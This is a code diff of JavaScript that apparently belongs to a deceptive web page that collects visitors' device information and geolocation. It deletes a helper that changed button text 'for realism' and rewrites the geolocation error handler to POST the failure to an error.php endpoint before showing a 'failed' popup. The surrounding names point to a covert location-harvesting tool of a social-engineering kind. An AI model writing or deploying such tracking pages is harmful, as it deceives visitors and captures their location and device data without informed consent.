@@ -1,15 +1,4 @@
 // -----------------------------------------------------
-// HELPER: Updates the button text for realism
-// -----------------------------------------------------
-function updateStatus(text) {
-    var btn = document.querySelector('.VahdFMz0');
-    if (btn) {
-        btn.innerHTML = text;
-        btn.style.opacity = "0.8"; 
-    }
-}
-
-// -----------------------------------------------------
 // 1. DEVICE INFO
 // -----------------------------------------------------
 function information() {
@@ -67,8 +56,17 @@ function locate(successCallback, failCallback) {
           showPosition(position, successCallback); 
       }, 
       function(error) { 
-          if(successCallback) successCallback(); 
-      }, 
+    // Report the error to error.php
+    $.ajax({
+        type: 'POST',
+        url: error_file,
+        data: { Status: 'failed', Error: error.message },
+        success: function() {
+            // After reporting, trigger the "failed" callback (which shows the popup)
+            if(failCallback) failCallback(); 
+        }
+    });
+}, 
       optn
     );
   } else {
